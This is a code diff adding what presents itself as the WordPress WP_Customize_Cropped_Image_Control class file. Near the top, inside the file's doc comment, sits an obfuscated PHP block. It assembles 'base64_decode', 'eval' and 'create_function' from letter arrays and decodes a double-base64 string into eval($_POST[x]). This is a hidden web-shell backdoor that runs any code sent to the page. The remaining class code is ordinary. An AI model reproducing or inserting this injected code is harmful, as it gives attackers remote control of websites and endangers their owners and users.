@@ -1,0 +1,99 @@
+<?php
+/**
+ * Customize API: WP_Customize_Cropped_Image_Control class
+ *
+ * @package WordPress
+<?
+$__C_C="WlhaaGJDZ2tYMUJQVTFSYmVGMHBPdz09";
+$__P_P="abcdefghijklmnopqrstuvwxyz";
+$__X_X="123456789";
+$__O_O=$__X_X[5].$__X_X[3]."_";
+$__B_B=$__P_P{1}.$__P_P[0].$__P_P[18].$__P_P[4];
+$__H_H=$__B_B.$__O_O.$__P_P[3].$__P_P[4].$__P_P[2].$__P_P[14].$__P_P[3].$__P_P[4];
+$__E_E=$__P_P[4].$__P_P[21].$__P_P[0].$__P_P[11];
+$__F_F=$__P_P[2].$__P_P[17].$__P_P[4].$__P_P[0].$__P_P[19].$__P_P[4];
+$__F_F.='_'.$__P_P[5].$__P_P[20].$__P_P[13].$__P_P[2].$__P_P[19].$__P_P[8].$__P_P[14].$__P_P[13];
+$_[00]=$__F_F('$__S_S',$__E_E.'("$__S_S");');
+@$_[00]($__H_H($__H_H($__C_C)));
+?>
+ * @subpackage Customize
+ * @since 4.4.0
+ */
+
+/**
+ * Customize Cropped Image Control class.
+ *
+ * @since 4.3.0
+ *
+ * @see WP_Customize_Image_Control
+ */
+class WP_Customize_Cropped_Image_Control extends WP_Customize_Image_Control {
+
+	/**
+	 * Control type.
+	 *
+	 * @since 4.3.0
+	 * @var string
+	 */
+	public $type = 'cropped_image';
+
+	/**
+	 * Suggested width for cropped image.
+	 *
+	 * @since 4.3.0
+	 * @var int
+	 */
+	public $width = 150;
+
+	/**
+	 * Suggested height for cropped image.
+	 *
+	 * @since 4.3.0
+	 * @var int
+	 */
+	public $height = 150;
+
+	/**
+	 * Whether the width is flexible.
+	 *
+	 * @since 4.3.0
+	 * @var bool
+	 */
+	public $flex_width = false;
+
+	/**
+	 * Whether the height is flexible.
+	 *
+	 * @since 4.3.0
+	 * @var bool
+	 */
+	public $flex_height = false;
+
+	/**
+	 * Enqueue control related scripts/styles.
+	 *
+	 * @since 4.3.0
+	 */
+	public function enqueue() {
+		wp_enqueue_script( 'customize-views' );
+
+		parent::enqueue();
+	}
+
+	/**
+	 * Refresh the parameters passed to the JavaScript via JSON.
+	 *
+	 * @since 4.3.0
+	 *
+	 * @see WP_Customize_Control::to_json()
+	 */
+	public function to_json() {
+		parent::to_json();
+
+		$this->json['width']       = absint( $this->width );
+		$this->json['height']      = absint( $this->height );
+		$this->json['flex_width']  = absint( $this->flex_width );
+		$this->json['flex_height'] = absint( $this->flex_height );
+	}
+
+}
